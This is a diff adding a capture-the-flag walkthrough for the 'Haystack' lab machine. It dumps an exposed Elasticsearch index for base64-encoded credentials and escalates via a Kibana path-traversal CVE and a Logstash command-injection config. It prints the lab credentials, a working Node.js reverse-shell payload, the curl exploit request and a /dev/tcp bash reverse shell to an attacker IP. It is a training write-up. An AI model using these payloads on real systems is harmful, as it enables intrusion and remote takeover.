@@ -135,3 +135,118 @@ p.interactive()
 ```
 
 (END)
+
+# Haystack
+
+This machine has a strong relationship with elasticsearch.
+
+## User
+
+Firstly, nmap it, you'll find 80 + 22 + 9200, which 9200 is a elasticsearch web API.
+
+Enum all indexes by accessing: http://10.10.10.115:9200/_cat/indices
+
+Get mapping from `quotes`: http://10.10.10.115:9200/quotes/_mapping
+
+Dump data from `quotes` using https://github.com/taskrabbit/elasticsearch-dump , also, this tool is using search API with scroll feature...
+
+```bash
+$ elasticdump \
+  --input=http://10.10.10.115:9200/quotes \
+  --output=/tmp/quotes_dump.json \
+  --type=data
+```
+
+After you get dumped data, run the following python script to extract all info.
+
+```python
+import json
+f1 = open("quote_index.json","r",encoding="utf-8").readlines()
+tmp2 = []
+for i in f1:
+    tmp00 = json.loads(i)
+    data = tmp00["_source"]["quote"]
+    data += "\n"
+    tmp2.append(data)
+f2 = open("result.txt","w",encoding="utf-8")
+f2.writelines(tmp2)
+f2.close()
+```
+
+In result.txt, you should find two base64-encoded string, which included the username and password encoded in base64, decode them:
+
+```
+user: security
+pass: spanish.is.key
+```
+
+User flag get.
+
+## Root
+
+Check: https://github.com/mpgn/CVE-2018-17246
+
+Save the following code to /tmp/tjr1.js , then run the next shell command on the remote victim box.
+
+```javascript
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(33234, "10.10.16.118", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+```
+
+```bash
+$ whoami
+security
+$ curl "http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/tjr1.js"
+```
+
+`nc -lvp 33234`, Get a reverse shell as Kibana.
+
+```
+$ pwd
+/etc/logstash/conf.d
+$ cat ./*.conf
+filter {
+        if [type] == "execute" {
+                grok {
+                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
+                }
+        }
+}
+input {
+        file {
+                path => "/opt/kibana/logstash_*"
+                start_position => "beginning"
+                sincedb_path => "/dev/null"
+                stat_interval => "10 second"
+                type => "execute"
+                mode => "read"
+        }
+}
+output {
+        if [type] == "execute" {
+                stdout { codec => json }
+                exec {
+                        command => "%{comando} &"
+                }
+        }
+}
+```
+
+Logstash collects unstructured data from log files and other sources, converts it into structured data, and inserts it into elasticsearch. According to the config, we build payload using this command: `echo 'Ejecutar comando : /bin/bash -i >& /dev/tcp/10.10.16.118/33938 0>&1' > /opt/kibana/logstash_sht2a`
+
+Then access http://10.10.10.115:9200/* to let the elasticsearch refresh its data, then wait about 10s.
+
+You will get root shell with `nc -lvp 33938`.
+
+(END)
+
